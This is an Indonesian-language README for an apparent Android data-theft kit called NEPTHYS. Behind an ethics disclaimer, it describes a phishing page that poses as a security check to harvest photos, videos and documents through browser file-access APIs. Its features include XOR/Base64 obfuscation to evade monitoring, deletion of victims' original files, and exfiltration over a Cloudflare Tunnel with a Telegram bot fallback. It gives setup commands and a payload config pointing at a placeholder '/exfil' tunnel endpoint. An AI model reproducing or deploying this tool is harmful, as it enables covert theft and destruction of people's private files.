# S-Xtrex

# Android File Exfiltration Framework - NEPTHYS

## ⚠️ DISCLAIMER MUTLAK & PERINGATAN ETIKA

**Framework ini murni ditujukan untuk tujuan penelitian keamanan (security research), pengujian penetrasi yang sah (authorized penetration testing), dan edukasi tentang kerentanan sistem file pada lingkungan Android.**
- Penggunaan di luar lingkungan yang Anda miliki atau kendalikan sepenuhnya tanpa otorisasi tertulis yang sah adalah **tindakan kriminal**.
- Aktivitas tersebut melanggar berbagai undang-undang siber global, termasuk **UU ITE di Indonesia**, dengan ancaman hukuman pidana penjara yang berat.
- Pengembang dan kontributor **tidak bertanggung jawab** atas penyalahgunaan alat ini.
- **Gunakan hanya pada sistem Anda sendiri atau dalam lingkup pengujian yang telah mendapat persetujuan hukum secara eksplisit.**

## 🧠 **Gambaran Umum**

NEPTHYS adalah framework proof-of-concept (PoC) berbasis web yang dirancang untuk mendemonstrasikan potensi risiko eksfiltrasi data pada perangkat Android melalui vektor berbasis browser. Framework ini mensimulasikan bagaimana sebuah halaman web berbahaya dapat berupaya mengakses, mengumpulkan, dan mengeksfiltrasi file media (gambar, video, dokumen) dari penyimpanan internal perangkat dengan menyamar sebagai proses "verifikasi keamanan" yang sah.

**Inti dari alat ini adalah untuk menyoroti pentingnya:**
1.  Kehati-hatian pengguna dalam memberikan izin akses file kepada situs web.
2.  Perlunya pembatasan yang lebih ketat pada API File System di browser.
3.  Kesadaran akan serangan phishing yang semakin canggih (social engineering).

## ✨ **Fitur & Keunggulan Utama**

Framework ini mengemas beberapa teknik maju dalam satu paket yang terintegrasi:

*   **Antarmuka Pengguna yang Menyesatkan (Advanced Social Engineering):** Menggunakan UI/UX yang dirancang profesional untuk menyerupai proses verifikasi keamanan yang sah, lengkap dengan progress bar, log sistem, dan estetika modern guna mengurangi kecurigaan pengguna.
*   **Multi-Vektor Akses File:** Mengimplementasikan beberapa metode untuk berinteraksi dengan sistem file Android, termasuk `window.showDirectoryPicker()` dan input `webkitdirectory`, guna meningkatkan peluang keberhasilan pada berbagai versi browser dan konfigurasi izin.
*   **Mekanisme Stealth & Anti-Forensics:**
    *   **Penghapusan Jejak Otomatis:** Dapat dikonfigurasi untuk menghapus file asli dari perangkat target setelah berhasil dieksfiltrasi.
    *   **Enkripsi Data In-Flight:** Menerapkan lapisan enkripsi XOR dan encoding Base64 pada data sebelum dikirimkan untuk menyembunyikan isinya dari pemantauan jaringan yang sederhana.
    *   **Penundaan Acak:** Memperkenalkan jeda waktu acak antar operasi untuk menghindari pola aktivitas yang mudah terdeteksi oleh sistem keamanan.
*   **Arsitektur Exfiltration yang Tangguh:**
    *   **Multi-Channel Delivery:** Mendukung pengiriman data melalui **Cloudflare Tunnel** (utama) dengan fallback otomatis ke **Telegram Bot API** jika saluran utama gagal.
    *   **Pemrosesan Berbasis Chunk:** Mengelola pengiriman file besar dengan memecahnya menjadi potongan-potongan (chunks) untuk menghindari timeouts.
*   **Manajemen Session dan Monitoring:**
    *   **Dashboard Server Terpusat:** Server backend menyediakan antarmuka web untuk melacak semua sesi aktif, melihat metadata file, dan mengunduh data yang telah dikumpulkan.
    *   **Pemberitahuan Real-Time:** Mengintegrasikan notifikasi instan ke Telegram untuk alerting saat data baru tiba.

## 🚀 **Panduan Penggunaan & Konfigurasi**

### **Langkah 1: Menyiapkan Lingkungan Backend**

1.  **Instalasi Prasyarat:**
    ```bash
    # Pastikan Node.js dan NPM terinstal
    node --version
    # Instal dependencies server
    npm install express axios
    ```

2.  **Konfigurasi Server (`advanced_server.js`):**
    *   Ganti placeholder `process.env.TELEGRAM_BOT_TOKEN` dan `process.env.TELEGRAM_CHAT_ID` dengan kredensial bot Telegram Anda yang sebenarnya (opsional, untuk notifikasi).
    *   Jalankan server:
        ```bash
        node advanced_server.js
        ```
    *  Server akan berjalan di `http://localhost:3000`. Dashboard dapat diakses di root URL.

3.  **Setup Cloudflare Tunnel (Untuk Akses Eksternal):**
    ```bash
    # Instal cloudflared
    # Autentikasi dan buat tunnel
    cloudflared tunnel login
    cloudflared tunnel create neptunus-tunnel
    # Edit file konfigurasi (~/.cloudflared/config.yml) untuk mengarahkan ke localhost:3000
    # Jalankan tunnel
    cloudflared tunnel run neptunus-tunnel
    ```
    *   Salihkan URL publik yang diberikan oleh Cloudflare Tunnel (misal: `https://random-sub.try.cloudflare.com`).

### **Langkah 2: Konfigurasi Payload (`index.html`)**

Buka file `index.html` dan cari bagian `CONFIG`. Sesuaikan nilai-nilai berikut:

```javascript
const CONFIG = {
    BOT_TOKEN: 'GANTI_DENGAN_BOT_TOKEN_ANDA', // Opsional, untuk fallback
    CHAT_ID: 'GANTI_DENGAN_CHAT_ID_ANDA',     // Opsional
    CLOUDFLARE_ENDPOINT: 'https://URL_TUNNEL_ANDA.try.cloudflare.com/exfil', // WAJIB
    TARGET_PATHS: ['/storage/emulated/0/DCIM/', '/storage/emulated/0/Download/'],
    // ... konfigurasi lainnya dapat disesuaikan
};
